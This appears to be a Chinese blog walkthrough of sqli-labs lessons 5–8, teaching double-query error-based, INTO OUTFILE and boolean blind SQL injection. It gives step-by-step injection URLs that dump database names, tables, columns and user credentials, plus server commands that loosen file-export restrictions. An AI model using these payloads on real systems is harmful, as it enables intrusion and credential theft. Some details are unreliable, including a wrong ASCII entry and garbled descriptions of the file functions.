<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>双注入GET单引号字符型注入</p>
<hr>
<h3 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h3><h4 id="什么是双查询？"><a href="#什么是双查询？" class="headerlink" title="什么是双查询？"></a>什么是双查询？</h4><p>双查询就是在 select 语句中再插入一个 select 语句，如下图所示：</p>
<p><img src="https://i.loli.net/2019/10/02/1eMlHYmObKqn8GS.png" alt="5-1y.png"></p>
<p>在查询的时候，会先执行 select database() 语句，然后再将该语句的执行结果传递给 count() 函数，从内到外依次执行。</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>对于双查询注入,需要先了解 count()、rand()、floor() 这三个函数的功能，以及 group by 的用法。</p>
<p>floor()：去除小数</p>
<p><img src="https://i.loli.net/2019/10/02/Hnob26tvASWx7wj.png" alt="5-4y.png"></p>
<p>rand()：产生随机数</p>
<p><img src="https://i.loli.net/2019/10/02/O4pA3gywDohJab1.png" alt="5-3y.png"></p>
<p>count()：对表中的数据进行计数</p>
<p><img src="https://i.loli.net/2019/10/02/ZIVn7QrcJPYe2ol.png" alt="5-2y.png"></p>
<p>group by：根据规则，对数据进行分组处理。</p>
<h4 id="双查询注入产生原因"><a href="#双查询注入产生原因" class="headerlink" title="双查询注入产生原因"></a>双查询注入产生原因</h4><p>使用 group by 子句结合 rand() 函数以及像 count（*） 这样的聚合函数，在 SQL 查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。</p>
<p><img src="https://i.loli.net/2019/10/02/4VhSFL5w6nruWyq.png" alt="5-5y.png"></p>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>以下面的查询语句为例：</p>
<pre class="line-numbers language-mysql"><code class="language-mysql">select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/03/5yvnlafeVmctWBJ.png" alt="5-7y.png"></p>
<p>首先，rand(0)的查询结果几乎消除了rand()函数原有的随机性，连续查询几次，我们会发现它的规律如下(01101)</p>
<p><img src="https://i.loli.net/2019/10/02/H3NOcbQEUSqxZve.png" alt="5-6y.png"></p>
<p>其次，使用 group by 语句和 count() 函数的时候，mysql 数据库会先建立一个虚拟表，当查询到新的键不在虚拟表中，数据库就会将其插入表中，如果数据库中已存在该键，则找到该键对应的计数字段并加 1。新建虚拟表如下：</p>
<style>
table th:first-of-type {
    height: 40px;
    width: 350px;
}

</style>

<table>
<thead>
<tr>
<th align="center">键</th>
<th align="center">计数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
</tr>
<tr>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
</tr>
<tr>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
</tr>
</tbody></table>
<p>由于使用了 rand(0)，在查询虚拟表之前会先执行一下 floor(rand(0)*2))，第一次的到结果为 0，发现虚拟表中没有，所以此时要插入键 0。</p>
<p>但是对于数据库而言 rand(0)<em>2 是一个未知数，因此插入数据时 floor(rand(0)</em>2)) 函数又需要执行一遍，此时的查询结果为 1 (根据上一张图片查询结果 01101 可知，第二次查询结果为 1)，所以此时要插入键 1，取第一条记录查询，虚拟表如下：</p>
<table>
<thead>
<tr>
<th align="center">键</th>
<th align="center">计数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
</tr>
<tr>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
</tr>
</tbody></table>
<p>取第二条记录查询，此时执行 floor(rand(0)*2)) 返回的结果为1(此时对应上面 01101 的第三次查询结果1)，查找虚拟表发现键 1 已经存在，所以直接加 1，虚拟表变化如下：</p>
<table>
<thead>
<tr>
<th align="center">键</th>
<th align="center">计数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
</tr>
<tr>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
</tr>
</tbody></table>
<p>取第三条记录查询，此时执行 floor(rand(0)<em>2)) 返回的结果为 0 (此时对应上面 01101 的第四次查询结果 0)，发现虚拟表中没有键0，所以要将其写入虚拟表。同样在写入虚拟表的时候，floor(rand(0)</em>2)) 又执行了一遍，此时查询结果为上面 01101 的第五次结果 1，但是键1已经存在虚拟表中，由于键只能唯一，所以此时就会报错。</p>
<table>
<thead>
<tr>
<th align="center">键</th>
<th align="center">计数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center"><font color="red"> 1 </font></td>
<td align="center"><font color="red"> 1 (报错)</font></td>
</tr>
<tr>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
</tr>
</tbody></table>
<p>所以在使用 floor()、rand(0)、count()、group by 时，数据表中至少要有 3 条记录才会报错.</p>
<h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/r4PYNDvSRpHAQl1.png" alt="less5-2.png"></p>
<ol start="2">
<li><strong>判断字段数</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1'  order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/HvSUCoZYGO4KAr2.png" alt="less5-3.png"></p>
<ol start="3">
<li><strong>爆数据库名</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/8hGdsnq63wkr2WU.png" alt="less5-4.png"></p>
<ol start="4">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/R4aFOGnt5mcoKZP.png" alt="less5-5.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/kTKAdcUzHynXwgf.png" alt="less5-6.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/45gvlwQ6MEyVPHh.png" alt="less5-7.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/ZbhXlOisazPtnBM.png" alt="less5-8.png"></p>
<ol start="5">
<li><strong>爆字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/p8UvOKb9SFwnQtN.png" alt="less5-9.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/oplvc9CgKjSPOet.png" alt="less5-10.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/LpKtAQPj4zf3FTv.png" alt="less5-11.png"></p>
<ol start="6">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/Kyk4fXjqtHO9B1F.png" alt="less5-12.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/28/NgponACb6TuJMHK.png" alt="less5-13.png"></p>
<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><p>双注入GET双引号字符型注入</p>
<hr>
<ol>
<li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/o8WZNc9r7peLsjA.png" alt="less6-1.png"></p>
<ol start="2">
<li><strong>判断字段数</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/EONfdcUSQuP1Vpn.png" alt="less6-2.png"></p>
<ol start="3">
<li><strong>爆数据库名</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/nc3TCwSApW8uKIE.png" alt="less6-3.png"></p>
<ol start="4">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/kKYSVsCW7vwjbuz.png" alt="less6-4.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/L5jKOq4YnpSashy.png" alt="less6-5.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/h3G7LJvDkfjbwNO.png" alt="less6-6.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/j2DLGe1XZgksOVE.png" alt="less6-7.png"></p>
<ol start="5">
<li><strong>爆字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/LKU591MmDXEpGv8.png" alt="less6-8.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/AubqBJvrEzWk5MR.png" alt="less6-9.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/eDoKxh7b6JHzNpt.png" alt="less6-10.png"></p>
<ol start="6">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/Ve26puIBRHrD51J.png" alt="less6-11.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/05/Mfv81dRo2FGC39X.png" alt="less6-12.png"></p>
<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>导出文件GET字符型注入</p>
<hr>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>思路：这次的标题是 dump into file 经过一些简单的测试，发现报错注入行不同，一些正常的注入也没有回显。所以结合标题 说明这题需要新的思路和手段。</p>
<h4 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h4><p>outfile：导出检索出的数据<br>loadfile：将表的内容导出为一个文本文件（一次导出一行）<br>dumpfile：将数据导入 MYSQL</p>
<h4 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h4><p>这个原理其实比较简单。就是利用语句 <code>into outfile ” 路径（服务器）”</code> 可以把内容输出到，服务器上该路径的文本中。</p>
<h3 id="注入步骤-1"><a href="#注入步骤-1" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-7/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/07/ESFlPXGr9OCgUK3.png" alt="less7-1.png"></p>
<p>注：”You have an error in your SQL syntax“ 这里数据库的报错信息被屏蔽了，所以只能手动猜测 sql 语句。</p>
<ol start="2">
<li><strong>使用“单引号+括号”判断执行的 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-7/?id=1')%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/07/ISi9sjTpxAPZB5H.png" alt="less7-2.png"></p>
<ol start="3">
<li><strong>使用“单引号+括号+括号”判断执行的 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-7/?id=1'))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/07/yRmgzXBYV4CZLrT.png" alt="less7-3.png"></p>
<p>注：输出正常，sql 语句为：select * from table where id=((‘input’))</p>
<ol start="4">
<li><strong>判断字段数</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-7/?id=1')) order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/07/HuKiOyUJlBtWZgc.png" alt="less7-4.png"></p>
<ol start="5">
<li><strong>测试当前用户权限</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) and(select count(*) from mysql.user)>0%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="6">
<li><strong>在服务器端修改 mysql 配置文件（开启 mysql 数据导入导出功能）</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">/** 编辑 my.cnf 文件 **/
[root@localhost ~]# vim /etc/my.cnf

/** 在文件中添加如下内容，如下图所示 **/
secure_file_priv=''<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/07/xX2aeIRbUfPiql9.png" alt="less7-5.png"></p>
<pre class="line-numbers language-text"><code class="language-text">/** 重启 mariadb **/
[root@localhost ~]# systemctl restart mariadb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text"><code class="language-text">/** 设置 /var/www 权限 **/
[root@localhost ~]# chmod -R 777 /var/www<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>注：mysql 默认禁用数据导入导出功能。</p>
<ol start="6">
<li><strong>导出数据到 “/var/www/html/test” 中</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) union select 1,2,3 into outfile "/var/www/html/test"%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/07/wXOMAL7Ul6vixdn.png" alt="less7-7.png"></p>
<p>注：网页报错，但是从服务器上可以看到数据已经成功导出。</p>
<ol start="7">
<li><strong>查看导出的数据</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/10/07/oXuEFwiafHs3G6k.png" alt="less7-8.png"></p>
<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>基于布尔的单引号GET盲注</p>
<hr>
<h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是-SQL-盲注？"><a href="#什么是-SQL-盲注？" class="headerlink" title="什么是 SQL 盲注？"></a>什么是 SQL 盲注？</h4><p>SQL盲注，就是网页不会根据你写的 sql 攻击语句返回你想要知道的错误信息，所以只能通过一些手段来猜测判断网页输出的内容。</p>
<h4 id="SQL盲注的分类"><a href="#SQL盲注的分类" class="headerlink" title="SQL盲注的分类"></a>SQL盲注的分类</h4><ul>
<li>布尔盲注</li>
</ul>
<p>界面能返回两个值 “true” 或 “false” 即 “布尔值” 。当你输入的 SQL 攻击语句成功后，网页返回值为 “true”，也就是说网页会输出正常的界面；当你输入的SQL攻击语句失败后，网页返回值为 “false”，也就是说网页会输出不正常的界面（比如网页少了部分内容）</p>
<ul>
<li>时间盲注</li>
</ul>
<p>界面只能返回一个值 “true”，无论你输入任何值，网页都是按正常来处理。此时，SQL 攻击语句中会加入时间函数来判断注入的语句是否正确。比如我通过“时间函数”让网页等待10秒再返回正常的界面。如果我等待了10秒才接受到正常界面，说面我的注入语句是正确的；如果我很快就接受到正常的界面，说明我的注入语句是错误的。</p>
<h4 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h4><p>对于布尔盲注,需要先了解 length()、substr()、ascii() 这三个函数的功能。</p>
<p>length(str)：返回字符串（str）的长度</p>
<p><img src="https://i.loli.net/2019/10/09/zYrp1isWEgIDP7B.png" alt="less8-1.png"></p>
<p>substr(str,pos,len)：从字符串（str）的第几个字符（pos）开始截取多长的字符串（len）</p>
<p><img src="https://i.loli.net/2019/10/09/7hM3U9rWznldDXq.png" alt="less8-2.png"></p>
<p>ascii(str)：将字符串（str）转换成 ascii 码</p>
<p><img src="https://i.loli.net/2019/10/09/Afoa3q1tXkNYhCI.png" alt="less8-3.png"></p>
<p>常用的 ascii</p>
<table>
<thead>
<tr>
<th align="center">ASCII值</th>
<th align="center">字符</th>
<th align="center">ASCII值</th>
<th align="center">字符</th>
<th align="center">ASCII值</th>
<th align="center">字符</th>
<th align="center">ASCII值</th>
<th align="center">字符</th>
<th align="center">ASCII值</th>
<th align="center">字符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">48</td>
<td align="center">0</td>
<td align="center">65</td>
<td align="center">A</td>
<td align="center">75</td>
<td align="center">K</td>
<td align="center">85</td>
<td align="center">U</td>
<td align="center">101</td>
<td align="center">e</td>
</tr>
<tr>
<td align="center">49</td>
<td align="center">1</td>
<td align="center">66</td>
<td align="center">B</td>
<td align="center">76</td>
<td align="center">L</td>
<td align="center">86</td>
<td align="center">V</td>
<td align="center">102</td>
<td align="center">f</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">2</td>
<td align="center">67</td>
<td align="center">C</td>
<td align="center">77</td>
<td align="center">M</td>
<td align="center">87</td>
<td align="center">W</td>
<td align="center">103</td>
<td align="center">g</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">3</td>
<td align="center">68</td>
<td align="center">D</td>
<td align="center">78</td>
<td align="center">N</td>
<td align="center">88</td>
<td align="center">X</td>
<td align="center">104</td>
<td align="center">h</td>
</tr>
<tr>
<td align="center">52</td>
<td align="center">4</td>
<td align="center">69</td>
<td align="center">E</td>
<td align="center">79</td>
<td align="center">O</td>
<td align="center">89</td>
<td align="center">Y</td>
<td align="center">105</td>
<td align="center">i</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">5</td>
<td align="center">70</td>
<td align="center">F</td>
<td align="center">80</td>
<td align="center">P</td>
<td align="center">90</td>
<td align="center">Z</td>
<td align="center">106</td>
<td align="center">j</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">6</td>
<td align="center">71</td>
<td align="center">G</td>
<td align="center">81</td>
<td align="center">Q</td>
<td align="center">97</td>
<td align="center">a</td>
<td align="center">107</td>
<td align="center">k</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">7</td>
<td align="center">72</td>
<td align="center">H</td>
<td align="center">82</td>
<td align="center">R</td>
<td align="center">98</td>
<td align="center">b</td>
<td align="center">108</td>
<td align="center">l</td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">8</td>
<td align="center">73</td>
<td align="center">I</td>
<td align="center">83</td>
<td align="center">S</td>
<td align="center">99</td>
<td align="center">c</td>
<td align="center">109</td>
<td align="center">m</td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">9</td>
<td align="center">74</td>
<td align="center">J</td>
<td align="center">84</td>
<td align="center">T</td>
<td align="center">100</td>
<td align="center">d</td>
<td align="center">110</td>
<td align="center">n</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">ASCII值</th>
<th align="center">字符</th>
<th align="center">ASCII值</th>
<th align="center">字符</th>
<th align="center">ASCII值</th>
<th align="center">字符</th>
<th align="center">ASCII值</th>
<th align="center">字符</th>
<th align="center">ASCII值</th>
<th align="center">字符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">111</td>
<td align="center">o</td>
<td align="center">112</td>
<td align="center">p</td>
<td align="center">113</td>
<td align="center">q</td>
<td align="center">114</td>
<td align="center">r</td>
<td align="center">115</td>
<td align="center">s</td>
</tr>
<tr>
<td align="center">116</td>
<td align="center">t</td>
<td align="center">117</td>
<td align="center">u</td>
<td align="center">118</td>
<td align="center">v</td>
<td align="center">119</td>
<td align="center">w</td>
<td align="center">120</td>
<td align="center">x</td>
</tr>
<tr>
<td align="center">121</td>
<td align="center">y</td>
<td align="center">122</td>
<td align="center">z</td>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
<td align="center">&nbsp;</td>
</tr>
</tbody></table>
<h4 id="工作原理-2"><a href="#工作原理-2" class="headerlink" title="工作原理"></a>工作原理</h4><ol>
<li><p>使用 ascii() + length() 函数判断出查询内容的字符长度</p>
</li>
<li><p>多次使用 ascii() + substr() 函数判断每个字符</p>
</li>
<li><p>将判断出的字符整合，得到查询结果。</p>
</li>
</ol>
<h3 id="注入步骤-2"><a href="#注入步骤-2" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/XP1AsxCu6iI8Rpj.png" alt="less8-4.png"></p>
<p>注：网页不是正常界面，使用布尔盲注进行测试</p>
<ol start="2">
<li><strong>判断数据库字符串的长度</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))>55%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/Yei8ndPQJ39HzGB.png" alt="less8-5.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))>56%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/ZRunGcPSwdhg5bT.png" alt="less8-6.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))=56%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/sePb4EIMOg19KW6.png" alt="less8-7.png"></p>
<ol start="3">
<li><strong>判断数据库</strong></li>
</ol>
<ul>
<li>判断第一个字母</li>
</ul>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))>110%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/KE7wlrNu1GSgVav.png" alt="less8-8.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))>115%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/eFXs9IfU2nNCASH.png" alt="less8-9.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))=115%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/r8f1K9OlnySh3FC.png" alt="less8-10.png"></p>
<p>注：第一个字符串的 ascii 值为 115，从上面的 ascii 表中可以找到相应的字符为 “ s ” </p>
<ul>
<li>判断第二个字母</li>
</ul>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))>100%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/DzgLq2x9WAtwKF7.png" alt="less8-11.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))>101%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/w2CADSa6zbhXlNG.png" alt="less8-12.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))=101%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/09/AMoWTIfOYiZkuJ9.png" alt="less8-13.png"></p>
